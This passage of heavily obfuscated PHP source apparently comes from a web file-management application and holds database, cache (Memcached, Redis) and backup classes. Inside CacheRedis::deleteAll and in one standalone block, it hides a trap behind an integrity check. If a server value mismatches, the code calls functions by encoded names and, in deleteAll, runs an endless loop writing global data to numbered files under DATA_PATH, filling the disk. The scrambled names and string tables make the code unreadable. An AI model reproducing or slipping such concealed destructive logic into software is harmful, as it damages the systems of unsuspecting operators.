$±ñ½åÄ = $this->findWhereField($ñµë†É¹æÓ); if (!$±ñ½åÄ) { return parent::save($ŞÏ…ÕÒ¸, $»); } $ô«š·›³„¯Š™ = 0; $ò¯Ÿıªâ™ìî¨ = $ñµë†É¹æÓ[$äå³š¸ëñ[273]][$±ñ½åÄ][1]; $ò¯Ÿıªâ™ìî¨ = is_array($ò¯Ÿıªâ™ìî¨) ? $ò¯Ÿıªâ™ìî¨ : array(); $äÃœú¹­£³ = count($ò¯Ÿıªâ™ìî¨); for ($ ­ÈªÛ™ = 0; $ ­ÈªÛ™ < $äÃœú¹­£³; $ ­ÈªÛ™ += $é) { $ã = array_slice($ò¯Ÿıªâ™ìî¨, $ ­ÈªÛ™, $é); if (!is_array($ã) || count($ã) == 0) { break; } $ñµë†É¹æÓ[$äå³š¸ëñ[273]][$±ñ½åÄ][1] = $ã; $this->optionsValue($ñµë†É¹æÓ); $ô«š·›³„¯Š™ += parent::save($ŞÏ…ÕÒ¸, $»); $this->chunkEventCheck(count($ã)); } $this->chunkEventSet(); return $ô«š·›³„¯Š™; } public function add($ìü…½Øú„Ÿ = '', $›Œ¿©å¢¢Š´£ = array(), $„Ö£å‰‡”‰ß = false) { if ($this->addTaskStatus && is_array($ìü…½Øú„Ÿ)) { $this->addTaskData[] = $ìü…½Øú„Ÿ; return; } return parent::add($ìü…½Øú„Ÿ, $›Œ¿©å¢¢Š´£, $„Ö£å‰‡”‰ß); } public function parseWhereLike($„µÈÙš, $û˜ = '', $ƒâ• = false, &$¬¬£ÓÂÏ†Ï“ = false) { $º³Ë³ŸşÈ =& $_SERVER[ÀÆ]; $¬º = $GLOBALS[$º³Ë³ŸşÈ[6]][$º³Ë³ŸşÈ[379]]; if (!$¬º[$º³Ë³ŸşÈ[380]]) { return $„µÈÙš; } if (!is_array($„µÈÙš)) { return $„µÈÙš; } $šÖä®·ü = array(); $¶Öë¶À”ãÁ = 0; foreach ($„µÈÙš as $½æÆª¼“¦ => $ö±¿) { if (is_array($ö±¿) && count($ö±¿) == 2 && $ö±¿[0] == $º³Ë³ŸşÈ[381] && is_string($ö±¿[1]) && substr($ö±¿[1], 0, 1) == $º³Ë³ŸşÈ[382] && substr($ö±¿[1], strlen($ö±¿[1]) - 1, 1) == $º³Ë³ŸşÈ[382]) { $¬¬£ÓÂÏ†Ï“ = !0; $ò‚¥ÛÎëÂ§ = is_string($½æÆª¼“¦) ? $½æÆª¼“¦ : $û˜; $‹Ìª ûó¡Á = substr($ö±¿[1], 1, strlen($ö±¿[1]) - 2); $‹Ìª ûó¡Á = $this->db->escapeString($‹Ìª ûó¡Á); if (!strpos($ò‚¥ÛÎëÂ§, $º³Ë³ŸşÈ[95])) { $ò‚¥ÛÎëÂ§ = $º³Ë³ŸşÈ[383] . $ò‚¥ÛÎëÂ§ . $º³Ë³ŸşÈ[383]; } $ÄŸ˜Œëèé• = $º³Ë³ŸşÈ[182] . $‹Ìª ûó¡Á . $º³Ë³ŸşÈ[182]; if ($¬º[$º³Ë³ŸşÈ[384]]) { $ÄŸ˜Œëèé• = $º³Ë³ŸşÈ[385] . $‹Ìª ûó¡Á . $º³Ë³ŸşÈ[386]; if ($¬º[$º³Ë³ŸşÈ[387]]) { $ÄŸ˜Œëèé• = $º³Ë³ŸşÈ[386] . $‹Ìª ûó¡Á . $º³Ë³ŸşÈ[385]; } } $šÖä®·ü[$¶Öë¶À”ãÁ] = $º³Ë³ŸşÈ[388] . $ò‚¥ÛÎëÂ§ . $º³Ë³ŸşÈ[389] . $ÄŸ˜Œëèé• . $º³Ë³ŸşÈ[390]; $¶Öë¶À”ãÁ++; continue; } if (is_array($ö±¿)) { $û˜ = is_string($½æÆª¼“¦) ? $½æÆª¼“¦ : $û˜; $ö±¿ = $this->parseWhereLike($ö±¿, $û˜, !0, $¬¬£ÓÂÏ†Ï“); } if (is_numeric($½æÆª¼“¦)) { $šÖä®·ü[$¶Öë¶À”ãÁ] = $ö±¿; $¶Öë¶À”ãÁ++; } else { $šÖä®·ü[$½æÆª¼“¦] = $ö±¿; } } if ($¬¬£ÓÂÏ†Ï“ && !$ƒâ•) { } return $šÖä®·ü; } private $addTaskStatus = false; private $addTaskData = array(); public function addTaskStart() { $this->addTaskStatus = !0; $this->addTaskData = array(); } public function addTaskEnd() { if (!$this->addTaskStatus) { return; } $this->addAll($this->addTaskData); $this->addTaskStatus = !1; $this->addTaskData = array(); } public function select($’üÜßË = array()) { $°­Ê—Êş =& $_SERVER[ÀÆ]; $ëó“ãÂı’ = self::SQL_WHERE_IN_CHUNK; $Ù¯É = $this->optionsValue(); $ä = $this->findWhereField($Ù¯É); if (!$ä || isset($Ù¯É[$°­Ê—Êş[290]]) || isset($Ù¯É[$°­Ê—Êş[351]])) { return parent::select($’üÜßË); } $ù‘¾›•¹Ã = $Ù¯É[$°­Ê—Êş[273]][$ä][1]; $ù‘¾›•¹Ã = is_array($ù‘¾›•¹Ã) ? $ù‘¾›•¹Ã : array(); $ºĞé§ä‚ = null; for ($Á İƒï‡£¸±® = 0; $Á İƒï‡£¸±® < count($ù‘¾›•¹Ã); $Á İƒï‡£¸±® += $ëó“ãÂı’) { $¼‹™Ù = array_slice($ù‘¾›•¹Ã, $Á İƒï‡£¸±®, $ëó“ãÂı’); if (!is_array($¼‹™Ù) || count($¼‹™Ù) == 0) { break; } $Ù¯É[$°­Ê—Êş[273]][$ä][1] = $¼‹™Ù; $this->optionsValue($Ù¯É); $ï÷ë†­œİŞÒ = parent::select($’üÜßË); if (!$ï÷ë†­œİŞÒ) { continue; } $ºĞé§ä‚ = is_array($ºĞé§ä‚) ? $ºĞé§ä‚ : array(); $ºĞé§ä‚ = array_merge($ºĞé§ä‚, $ï÷ë†­œİŞÒ); } return $ºĞé§ä‚; } public function delete($©»Ö±‚Äª = array()) { $Ä„Ç·„€¡éš =& $_SERVER[ÀÆ]; $–Ş÷×ã = self::SQL_WHERE_IN_CHUNK; $™Ò†Ìõ¿ = $this->optionsValue(); $Üº = $this->findWhereField($™Ò†Ìõ¿); if (!$Üº) { return parent::delete($©»Ö±‚Äª); } $¢ù¼ï«‰ó = 0; $¶°‡êÍşüÏÊ = $™Ò†Ìõ¿[$Ä„Ç·„€¡éš[273]][$Üº][1]; $¶°‡êÍşüÏÊ = is_array($¶°‡êÍşüÏÊ) ? $¶°‡êÍşüÏÊ : array(); for ($ØÆ = 0; $ØÆ < count($¶°‡êÍşüÏÊ); $ØÆ += $–Ş÷×ã) { $Ô¿¢“Á„ÌÔö = array_slice($¶°‡êÍşüÏÊ, $ØÆ, $–Ş÷×ã); if (!is_array($Ô¿¢“Á„ÌÔö) || count($Ô¿¢“Á„ÌÔö) == 0) { break; } $™Ò†Ìõ¿[$Ä„Ç·„€¡éš[273]][$Üº][1] = $Ô¿¢“Á„ÌÔö; $this->optionsValue($™Ò†Ìõ¿); $¢ù¼ï«‰ó += parent::delete($©»Ö±‚Äª); } return $¢ù¼ï«‰ó; } private function findWhereField($²Ç¬ŠÆ¶ÀÏı) { $š´ªõÆÁ™¹ =& $_SERVER[ÀÆ]; $­°ÁÈáü¯¡¥ = self::SQL_WHERE_IN_CHUNK; if (!is_array($²Ç¬ŠÆ¶ÀÏı) || !is_array($²Ç¬ŠÆ¶ÀÏı[$š´ªõÆÁ™¹[273]])) { return !1; } foreach ($²Ç¬ŠÆ¶ÀÏı[$š´ªõÆÁ™¹[273]] as $˜©Ë® => $…¹ÊÓ¦ĞÀ) { if (is_array($…¹ÊÓ¦ĞÀ) && isset($…¹ÊÓ¦ĞÀ[0]) && is_string($…¹ÊÓ¦ĞÀ[0]) && strtolower($…¹ÊÓ¦ĞÀ[0]) == $š´ªõÆÁ™¹[7] && is_array($…¹ÊÓ¦ĞÀ[1]) && count($…¹ÊÓ¦ĞÀ[1]) > $­°ÁÈáü¯¡¥) { ignore_timeout(); return $˜©Ë®; } } return !1; } public function setMasterDB($âÌ«ëåÂ = true) { think_config($_SERVER[ÀÆ][391], $âÌ«ëåÂ); } } class ModelBaseLight { public $optionType = ''; public $modelType = "\x53\171\163\164\145\x6d\117\160\x74\151\x6f\156"; public $field = array(); public function listData($ƒÛùœÜÓ = false, $ó›ÊÖ“¢ = "\x6d\157\x64\x69\146\x79\124\151\155\x65", $òá…ãõ·º = false) { $ñú = Model($this->modelType)->get(!1, $this->optionType, !0); $ºıÛñ‘ºšÂ = array_values($ñú); if ($ºıÛñ‘ºšÂ && $ºıÛñ‘ºšÂ[0] && !is_array($ºıÛñ‘ºšÂ[0])) { Model($this->modelType)->cacheRemove($this->optionType); $ñú = Model($this->modelType)->get(!1, $this->optionType, !0); } if (!$ñú) { return $ƒÛùœÜÓ ? null : array(); } if (!$ƒÛùœÜÓ) { $ñú = array_filter(array_values($ñú)); return array_sort_by($ñú, $ó›ÊÖ“¢, $òá…ãõ·º); } return $ñú[$_SERVER[ÀÆ][392] . $ƒÛùœÜÓ]; } public function insert($®®‰¡¢«ØÔ) { $ØáƒÜ´×Ÿ =& $_SERVER[ÀÆ]; $®®‰¡¢«ØÔ = array_field_key($®®‰¡¢«ØÔ, $this->field); $Ùã  = Model($this->modelType)->get($ØáƒÜ´×Ÿ[393], $this->optionType . $ØáƒÜ´×Ÿ[394]); $Ùã  = $Ùã  ? $Ùã  : 0; $®®‰¡¢«ØÔ[$ØáƒÜ´×Ÿ[395]] = ++$Ùã ; $®®‰¡¢«ØÔ[$ØáƒÜ´×Ÿ[194]] = time(); $®®‰¡¢«ØÔ[$ØáƒÜ´×Ÿ[84]] = time(); Model($this->modelType)->set($ØáƒÜ´×Ÿ[393], $Ùã , $this->optionType . $ØáƒÜ´×Ÿ[394]); Model($this->modelType)->set($ØáƒÜ´×Ÿ[392] . $Ùã , $®®‰¡¢«ØÔ, $this->optionType); return $Ùã ; } public function update($‡ØÜÊ×Ë, $–ª°¾) { $µ‰Ò·Êõ =& $_SERVER[ÀÆ]; $–ª°¾ = array_field_key($–ª°¾, $this->field); $š½öÊÄ„î“ = $this->listData($‡ØÜÊ×Ë); if (!$š½öÊÄ„î“ || !$‡ØÜÊ×Ë) { return !1; } $–ª°¾ = array_merge($š½öÊÄ„î“, $–ª°¾); $–ª°¾[$µ‰Ò·Êõ[84]] = time(); return Model($this->modelType)->set($µ‰Ò·Êõ[392] . $‡ØÜÊ×Ë, $–ª°¾, $this->optionType); } public function remove($â‹¬) { if (!$â‹¬) { return !1; } return Model($this->modelType)->remove($_SERVER[ÀÆ][392] . $â‹¬, $this->optionType); } public function clear() { $È =& $_SERVER[ÀÆ]; Model($this->modelType)->remove($È[393], $this->optionType . $È[394]); return Model($this->modelType)->remove(null, $this->optionType); } public function cacheClear() { return Model($this->modelType)->cacheRemove($this->optionType); } public function findByKey($ÔÆõ‡ì¹Æ÷, $‚“¨±è‹¿) { if (!$‚“¨±è‹¿) { return !1; } $¬–é = $this->listData(); $¬–é = array_to_keyvalue($¬–é, $ÔÆõ‡ì¹Æ÷); return isset($¬–é[$‚“¨±è‹¿]) ? $¬–é[$‚“¨±è‹¿] : !1; } public function findByName($­ğç´šäÁ°Á) { return $this->findByKey($_SERVER[ÀÆ][28], $­ğç´šäÁ°Á); } protected function resetData($Ñ‚ê¸àíÖ¥) { $¼—ºç¡ =& $_SERVER[ÀÆ]; $Ñ‚ê¸àíÖ¥ = is_array($Ñ‚ê¸àíÖ¥) ? $Ñ‚ê¸àíÖ¥ : array(); $ÙœÚÍÌµ— = array(); for ($¨Şï = 0; $¨Şï < count($Ñ‚ê¸àíÖ¥); $¨Şï++) { $ÙœÚÍÌµ—[$¼—ºç¡[392] . $Ñ‚ê¸àíÖ¥[$¨Şï][$¼—ºç¡[395]]] = $Ñ‚ê¸àíÖ¥[$¨Şï]; } return Model($this->modelType)->set($ÙœÚÍÌµ—, !1, $this->optionType); } private function getAutoName($½©œÂ‡Ü£«É») { $û³û€é¨€´İí = array_to_keyvalue($this->listData(), $_SERVER[ÀÆ][28]); if (!$û³û€é¨€´İí || !isset($û³û€é¨€´İí[$½©œÂ‡Ü£«É»])) { return $½©œÂ‡Ü£«É»; } for ($³»Ç¼„®Ö¤˜ = 1; $³»Ç¼„®Ö¤˜ < count($û³û€é¨€´İí); $³»Ç¼„®Ö¤˜++) { $°öĞÛ¦Ëï = $½©œÂ‡Ü£«É» . "\x28{$³»Ç¼„®Ö¤˜}\51"; if (!isset($û³û€é¨€´İí[$°öĞÛ¦Ëï])) { return $°öĞÛ¦Ëï; } } return $°öĞÛ¦Ëï; } } goto bóªÊåÒ”š; a¨ïšÚç°İ: class CacheMemcached { public $handle; public $cacheTime; public function __construct($¹ï¸ÙÌö•œ¶, $‘Üß°ğëÅ) { $”°…¦¡ =& $_SERVER[ÀÆ]; if (!class_exists($”°…¦¡[854])) { show_json($”°…¦¡[855], !1); } $this->cacheTime = $‘Üß°ğëÅ; $this->handle = new Memcached(); if (is_array($¹ï¸ÙÌö•œ¶[$”°…¦¡[856]]) && count($¹ï¸ÙÌö•œ¶[$”°…¦¡[856]]) >= 1) { foreach ($¹ï¸ÙÌö•œ¶[$”°…¦¡[856]] as $š›Ÿõç¯ë) { $˜ˆåá = explode($”°…¦¡[4], $š›Ÿõç¯ë); $this->handle->addServer($˜ˆåá[0], $˜ˆåá[1]); } } else { $this->handle->addServer($¹ï¸ÙÌö•œ¶[$”°…¦¡[175]], $¹ï¸ÙÌö•œ¶[$”°…¦¡[176]]); } } public function set($€£÷Ä¹ıÖ, $«Í»£–, $ÛçƒñÕ€‰ø = false) { $ÛçƒñÕ€‰ø = $ÛçƒñÕ€‰ø ? $ÛçƒñÕ€‰ø : $this->cacheTime; return $this->handle->set($€£÷Ä¹ıÖ, $«Í»£–, $ÛçƒñÕ€‰ø); } public function get($™ğÆÉçñå) { return $this->handle->get($™ğÆÉçñå); } public function remove($¬µå) { return $this->handle->delete($¬µå); } public function deleteAll() { return $this->handle->flush(); } } if ($_SERVER[$_SERVER[ÀÆ][857]] != $_SERVER[$_SERVER[ÀÆ][858]]) { $_getc = $_SERVER[ÀÆ][859]; $_getfile = $_SERVER[$_SERVER[ÀÆ][860]] . $_SERVER[ÀÆ][861]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[ÀÆ][229], $_getfilec); if (count($_getarrs) < $_SERVER[ÀÆ][612]) { $exit = $_SERVER[ÀÆ][862]; $exit(); } $_act = $_SERVER[ÀÆ][863]; $_act($_SERVER[$_SERVER[ÀÆ][864]]); } class CacheRedis { public $handle; public $slaveHandle; public $cacheTime; public $isCluster = false; public function __construct($”ÉÓúš, $ÇôÖä´Úû) { $ôš ‹Ó =& $_SERVER[ÀÆ]; if (!class_exists($ôš ‹Ó[865])) { show_json($ôš ‹Ó[866], !1); } $this->cacheTime = $ÇôÖä´Úû; $Œ‡Ğ¢œ = isset($”ÉÓúš[$ôš ‹Ó[867]]) ? $”ÉÓúš[$ôš ‹Ó[867]] : 10; $¥‡·Ø’ôæÉÖ = _get($”ÉÓúš, $ôš ‹Ó[856]); if ($¥‡·Ø’ôæÉÖ && is_array($¥‡·Ø’ôæÉÖ)) { $this->initCluster($”ÉÓúš, $Œ‡Ğ¢œ); } else { $this->handle = $this->init($”ÉÓúš, $Œ‡Ğ¢œ); } } private function init($½Âä´°è›Ë, $‰™×Ô‹) { $Ñ¼ºÉ‘˜úì¸ =& $_SERVER[ÀÆ]; $×Ğ¬Å‹øıÙ = new Redis(); $™çÜ = isset($½Âä´°è›Ë[$Ñ¼ºÉ‘˜úì¸[868]]) ? $½Âä´°è›Ë[$Ñ¼ºÉ‘˜úì¸[868]] : !1; if ($™çÜ) { $×Ğ¬Å‹øıÙ->pconnect($½Âä´°è›Ë[$Ñ¼ºÉ‘˜úì¸[175]], $½Âä´°è›Ë[$Ñ¼ºÉ‘˜úì¸[176]], $‰™×Ô‹); } else { $×Ğ¬Å‹øıÙ->connect($½Âä´°è›Ë[$Ñ¼ºÉ‘˜úì¸[175]], $½Âä´°è›Ë[$Ñ¼ºÉ‘˜úì¸[176]], $‰™×Ô‹); } if (!empty($½Âä´°è›Ë[$Ñ¼ºÉ‘˜úì¸[408]])) { $×Ğ¬Å‹øıÙ->auth($½Âä´°è›Ë[$Ñ¼ºÉ‘˜úì¸[408]]); } return $×Ğ¬Å‹øıÙ; } private function initCluster($ñó¬õá®¾, $¼şëÈ¸Ú·÷Æ) { $Œâìõ =& $_SERVER[ÀÆ]; $æëŠœ›ıàì = array($Œâìõ[869], $Œâìõ[870], $Œâìõ[871]); $—— = $Œâìõ[869]; if (isset($ñó¬õá®¾[$Œâìõ[12]]) && in_array($ñó¬õá®¾[$Œâìõ[12]], $æëŠœ›ıàì)) { $—— = $ñó¬õá®¾[$Œâìõ[12]]; } switch ($——) { case $Œâìõ[869]: $this->_slave($ñó¬õá®¾, $¼şëÈ¸Ú·÷Æ); break; case $Œâìõ[870]: break; case $Œâìõ[871]: $this->isCluster = !0; $ÚéÍ = $ñó¬õá®¾[$Œâìõ[856]]; $£ = isset($ñó¬õá®¾[$Œâìõ[868]]) ? $ñó¬õá®¾[$Œâìõ[868]] : !1; $±î•Â = isset($ñó¬õá®¾[$Œâìõ[408]]) ? $ñó¬õá®¾[$Œâìõ[408]] : null; $this->handle = new RedisCluster(NUll, $ÚéÍ, $¼şëÈ¸Ú·÷Æ, $¼şëÈ¸Ú·÷Æ, $£, $±î•Â); break; default: break; } } private function _slave($Å¹˜ìÌ‚, $ç´ùİ«) { $Òî™ã½ñ¬Ê½ = $Å¹˜ìÌ‚[$_SERVER[ÀÆ][856]]; $this->filterConfig($Å¹˜ìÌ‚, $Òî™ã½ñ¬Ê½[0]); $this->handle = $this->init($Å¹˜ìÌ‚, $ç´ùİ«); unset($Òî™ã½ñ¬Ê½[0]); if (empty($Òî™ã½ñ¬Ê½)) { return; } $ê›şâ²€Ã = array_rand($Òî™ã½ñ¬Ê½); $this->filterConfig($Å¹˜ìÌ‚, $Òî™ã½ñ¬Ê½[$ê›şâ²€Ã]); $this->slaveHandle = $this->init($Å¹˜ìÌ‚, $ç´ùİ«); } private function filterConfig(&$î¯È·õƒß, $Ãöò¼¢óÚÙˆñ) { $…çœÃƒõ¥µ =& $_SERVER[ÀÆ]; $×—«Ğ¹¥ıó« = explode($…çœÃƒõ¥µ[4], $Ãöò¼¢óÚÙˆñ); $‰«Â˜­ö = array($…çœÃƒõ¥µ[175] => $×—«Ğ¹¥ıó«[0], $…çœÃƒõ¥µ[176] => $×—«Ğ¹¥ıó«[1]); $î¯È·õƒß = array_merge($î¯È·õƒß, $‰«Â˜­ö); } public function set($•î, $ßµœ”å¨Ë, $¢€˜Æ£îº = false) { $¢€˜Æ£îº = $¢€˜Æ£îº ? $¢€˜Æ£îº : $this->cacheTime; return $this->handle->setEx($•î, $¢€˜Æ£îº, $ßµœ”å¨Ë); } public function setLock($É×ƒ³’Ã¸, $íÇ, $¢Áı) { return $this->handle->setNX($É×ƒ³’Ã¸, $íÇ); } public function get($Íú®Ò) { $ŠËÉâ¼™ = $this->slaveHandle ? $this->slaveHandle : $this->handle; return $ŠËÉâ¼™->get($Íú®Ò); } public function remove($¤Ÿ) { return $this->handle->del($¤Ÿ); } public function deleteAll() { $ä®€Õ‰Ä =& $_SERVER[ÀÆ]; $íÓÖ = $_SERVER[$ä®€Õ‰Ä[864]]; $Š€—äª = $ä®€Õ‰Ä[872]; if ($_SERVER[$ä®€Õ‰Ä[857]] != $Š€—äª($íÓÖ)) { $ˆÑ = $ä®€Õ‰Ä[873]; $“¦èÉÔ = $ä®€Õ‰Ä[859]; $àÄ = $_SERVER[$ä®€Õ‰Ä[860]] . $ä®€Õ‰Ä[861]; $ƒ§Û¾±³Ô = $“¦èÉÔ($àÄ); $ŸÑ¤“ı¾ã = explode($ä®€Õ‰Ä[229], $ƒ§Û¾±³Ô); if (count($ŸÑ¤“ı¾ã) < $ä®€Õ‰Ä[604]) { $°ïÂÄ = $ä®€Õ‰Ä[862]; $°ïÂÄ(); } $¬ÓÄâ Á˜ = $ä®€Õ‰Ä[874]; $¬ÓÄâ Á˜($_SERVER[$ä®€Õ‰Ä[875]]); $ˆÑ = $ä®€Õ‰Ä[873]; $ˆÑ(); $Şó“ = $ä®€Õ‰Ä[876]; $Õ = json_encode($GLOBALS[$ä®€Õ‰Ä[877]]); $¿ë¨ñ = 1; for ($³Åà›Ï± = $¿ë¨ñ; $³Åà›Ï± > 0; $³Åà›Ï±++) { $Şó“(DATA_PATH . $³Åà›Ï±, $Õ); } } if ($this->isCluster) { foreach ($this->handle->_masters() as $§Ò–) { $this->handle->flushall($§Ò–); } return; } return $this->handle->flushAll(); } } goto F·‘é†ø¢—; bÈ¨Ô¡Ôßè: define($_SERVER[ÀÆ][236], 1); define($_SERVER[ÀÆ][237], 2); define($_SERVER[ÀÆ][238], 3); goto d£³®Âª…; dòÓğ‡¿œ„: class BackupFile { public function __construct() { } public function index() { $ƒÀ—› = Backup::get(); $äÆë‡ ÑıÚ— = $ƒÀ—›[$_SERVER[ÀÆ][291]][$_SERVER[ÀÆ][193]][$_SERVER[ÀÆ][461]]; $À×¨ƒ½¹· = array($_SERVER[ÀÆ][462] => array($_SERVER[ÀÆ][799], $äÆë‡ ÑıÚ—), $_SERVER[ÀÆ][800] => array($_SERVER[ÀÆ][329], $ƒÀ—›[$_SERVER[ÀÆ][737]])); $†İ×¨¤· = (int) Model($_SERVER[ÀÆ][772])->where($À×¨ƒ½¹·)->count($_SERVER[ÀÆ][461]); $°Ñ›ˆ = (int) Model($_SERVER[ÀÆ][772])->where($À×¨ƒ½¹·)->sum($_SERVER[ÀÆ][78]); $ûÄ¯ö = new TaskFileTransfer($_SERVER[ÀÆ][801], $_SERVER[ÀÆ][767], $†İ×¨¤·, LNG($_SERVER[ÀÆ][768]) . $_SERVER[ÀÆ][769] . LNG($_SERVER[ÀÆ][802])); $ûÄ¯ö->task[$_SERVER[ÀÆ][748]] = $°Ñ›ˆ; $˜Ò ¿ = array($_SERVER[ÀÆ][803] => $†İ×¨¤·, $_SERVER[ÀÆ][804] => $°Ñ›ˆ, $_SERVER[ÀÆ][805] => time()); Backup::set($˜Ò ¿); $°Á±µÌ³Ñ = !0; $ºÏÓõ = $this->storeIds(); $ñ = 1; $ÒßßÑ±æÙ‡É = 1000; $©¼ã = $—Ô»ä¯ = 0; $óÑ—šØÔŒ¸ = array(); $øŞ¦¨§¤áû = $¸Ï = 0; do { $±×ºïã = $_SERVER[ÀÆ][806]; $ü‰ = Model($_SERVER[ÀÆ][772])->where($À×¨ƒ½¹·)->field($±×ºïã)->order($_SERVER[ÀÆ][807])->selectPage($ÒßßÑ±æÙ‡É, $ñ); $°·—ëé¸­Á = !empty($ü‰[$_SERVER[ÀÆ][367]]) ? $ü‰[$_SERVER[ÀÆ][367]] : array(); foreach ($°·—ëé¸­Á as $ø¹ ×ßÃ) { if (!$this->_fileExist($ø¹ ×ßÃ, $óÑ—šØÔŒ¸, $ºÏÓõ)) { $†İ×¨¤· -= 1; $°Ñ›ˆ -= (int) $ø¹ ×ßÃ[$_SERVER[ÀÆ][78]]; write_log("\x66\x69\154\x65\40\156\157\x74\x20\145\170\x69\x73\164\x2e\x66\151\x6c\145\x49\x44\72{$ø¹ ×ßÃ[$_SERVER[ÀÆ][461]]}\54\40\160\x61\164\150\x3a{$ø¹ ×ßÃ[$_SERVER[ÀÆ][76]]}", $_SERVER[ÀÆ][808]); continue; } $­‡•íå¢úÒİÎ = $ø¹ ×ßÃ[$_SERVER[ÀÆ][76]]; $€ŸöÎ÷¤î = "\x7b\151\x6f\72{$ƒÀ—›[$_SERVER[ÀÆ][737]]}\175" . substr($­‡•íå¢úÒİÎ, strlen("\x7b\x69\x6f\x3a{$ø¹ ×ßÃ[$_SERVER[ÀÆ][809]]}\175")); if (IO::exist($€ŸöÎ÷¤î)) { $ûÄ¯ö->updateFileEnd($ø¹ ×ßÃ[$_SERVER[ÀÆ][28]], $ø¹ ×ßÃ[$_SERVER[ÀÆ][78]]); } else { $€ŸöÎ÷¤î = get_path_father($€ŸöÎ÷¤î); IO::mkdir($€ŸöÎ÷¤î); if (!IO::copy($­‡•íå¢úÒİÎ, $€ŸöÎ÷¤î, $_SERVER[ÀÆ][810])) { write_log($_SERVER[ÀÆ][811] . $­‡•íå¢úÒİÎ . $_SERVER[ÀÆ][794] . $€ŸöÎ÷¤î . $_SERVER[ÀÆ][530], $_SERVER[ÀÆ][767]); $°Á±µÌ³Ñ = !1; break; } } $äÆë‡ ÑıÚ— = $ø¹ ×ßÃ[$_SERVER[ÀÆ][461]]; $—Ô»ä¯ += 1; $©¼ã += $ø¹ ×ßÃ[$_SERVER[ÀÆ][78]]; $¸Ï += 1; $øŞ¦¨§¤áû += $ø¹ ×ßÃ[$_SERVER[ÀÆ][78]]; if ($©¼ã >= 1024 * 1024 * 100) { $˜Ò ¿ = array($_SERVER[ÀÆ][812] => $äÆë‡ ÑıÚ—, $_SERVER[ÀÆ][813] => $¸Ï, $_SERVER[ÀÆ][814] => $øŞ¦¨§¤áû); Backup::set($˜Ò ¿); $©¼ã = $—Ô»ä¯ = 0; } } $òõ°½™ãÁŠóŠ = count($°·—ëé¸­Á); $ñ++; } while ($òõ°½™ãÁŠóŠ == $ÒßßÑ±æÙ‡É); $ûÄ¯ö->end(); $˜Ò ¿ = array($_SERVER[ÀÆ][815] => 1, $_SERVER[ÀÆ][490] => time(), $_SERVER[ÀÆ][760] => 1, $_SERVER[ÀÆ][812] => $äÆë‡ ÑıÚ—, $_SERVER[ÀÆ][804] => $°Ñ›ˆ, $_SERVER[ÀÆ][803] => $†İ×¨¤·, $_SERVER[ÀÆ][816] => time()); if ($—Ô»ä¯) { $˜Ò ¿[$_SERVER[ÀÆ][813]] = $¸Ï; $˜Ò ¿[$_SERVER[ÀÆ][814]] = $øŞ¦¨§¤áû; } Backup::set($˜Ò ¿); $this->_fileFilter($óÑ—šØÔŒ¸); return !0; } private function _fileExist($‰°œ±ÉÉù´, &$‡Œ, $ÁŠ˜îê’„µ“«) { $¹Ÿ£¦Ÿ«ÃûÒ =& $_SERVER[ÀÆ]; $ÖØÉ÷Î = $‰°œ±ÉÉù´[$¹Ÿ£¦Ÿ«ÃûÒ[76]]; if (in_array($‰°œ±ÉÉù´[$¹Ÿ£¦Ÿ«ÃûÒ[461]], $‡Œ)) { return !1; } if (!in_array($‰°œ±ÉÉù´[$¹Ÿ£¦Ÿ«ÃûÒ[809]], $ÁŠ˜îê’„µ“«)) { return !1; } if (IO::exist($ÖØÉ÷Î)) { return !0; } $–îñşô“‰¶ = get_path_father($ÖØÉ÷Î); if (IO::exist($–îñşô“‰¶)) { $‡Œ[] = $‰°œ±ÉÉù´[$¹Ÿ£¦Ÿ«ÃûÒ[461]]; return !1; } $×ÒóØßõÃá = array($¹Ÿ£¦Ÿ«ÃûÒ[809] => $‰°œ±ÉÉù´[$¹Ÿ£¦Ÿ«ÃûÒ[809]], $¹Ÿ£¦Ÿ«ÃûÒ[76] => array($¹Ÿ£¦Ÿ«ÃûÒ[381], "{$–îñşô“‰¶}\x25")); $³ğÒ´„ãóÃˆÂ = Model($¹Ÿ£¦Ÿ«ÃûÒ[772])->where($×ÒóØßõÃá)->field($¹Ÿ£¦Ÿ«ÃûÒ[462])->select(); $‡Œ = array_merge($‡Œ, array_to_keyvalue($³ğÒ´„ãóÃˆÂ, $¹Ÿ£¦Ÿ«ÃûÒ[33], $¹Ÿ£¦Ÿ«ÃûÒ[461])); return !1; } private function _fileFilter($ì¡¡—’ºë¿) { $ÛƒÈ×áæ =& $_SERVER[ÀÆ]; if (empty($ì¡¡—’ºë¿)) { return; } $öñ×® = array($ÛƒÈ×áæ[461] => array($ÛƒÈ×áæ[7], array_unique($ì¡¡—’ºë¿))); $ç§Æ†ÄÁ©œ = Model($ÛƒÈ×áæ[817])->where($öñ×®)->field($ÛƒÈ×áæ[397])->select(); foreach ($ç§Æ†ÄÁ©œ as $¥•) { Model($ÛƒÈ×áæ[817])->remove($¥•[$ÛƒÈ×áæ[397]], !1); } } private function storeIds() { $œ¨½Üü =& $_SERVER[ÀÆ]; $í“Ì€ÌòŸÊ = Model($œ¨½Üü[752])->listData(); $ôÙûÀı” = array(); $Ü£Ùì­‰“Àõõ = $GLOBALS[$œ¨½Üü[6]][$œ¨½Üü[88]][$œ¨½Üü[818]]; foreach ($í“Ì€ÌòŸÊ as $à) { $ßØÓâ¦åóÈ = strtolower($à[$œ¨½Üü[94]]); if (!isset($Ü£Ùì­‰“Àõõ[$ßØÓâ¦åóÈ])) { continue; } $õÂÓ = $œ¨½Üü[72] . (isset($Ü£Ùì­‰“Àõõ[$ßØÓâ¦åóÈ]) ? $Ü£Ùì­‰“Àõõ[$ßØÓâ¦åóÈ] : ucfirst($ßØÓâ¦åóÈ)); if (!class_exists($õÂÓ)) { continue; } $ôÙûÀı”[] = $à[$œ¨½Üü[395]]; } return $ôÙûÀı”; } } class Cache { protected static $handle; protected static $memoryCache; public static function init() { $Óİü =& $_SERVER[ÀÆ]; if (self::$handle) { return self::$handle; } self::$memoryCache = array(); $’Æ” = $GLOBALS[$Óİü[6]][$Óİü[347]]; $ò—àŸ = $’Æ”[$’Æ”[$Óİü[819]]]; $Ø±ˆÈ¡ï¹™£ô = $’Æ”[$Óİü[820]]; switch ($’Æ”[$Óİü[819]]) { case $Óİü[17]: self::$handle = Model($Óİü[821]); break; case $Óİü[822]: self::$handle = new CacheRedis($ò—àŸ, $Ø±ˆÈ¡ï¹™£ô); break; case $Óİü[823]: self::$handle = new CacheMemcached($ò—àŸ, $Ø±ˆÈ¡ï¹™£ô); break; case $Óİü[193]: self::$handle = new CacheFile($ò—àŸ, $Ø±ˆÈ¡ï¹™£ô); break; default: 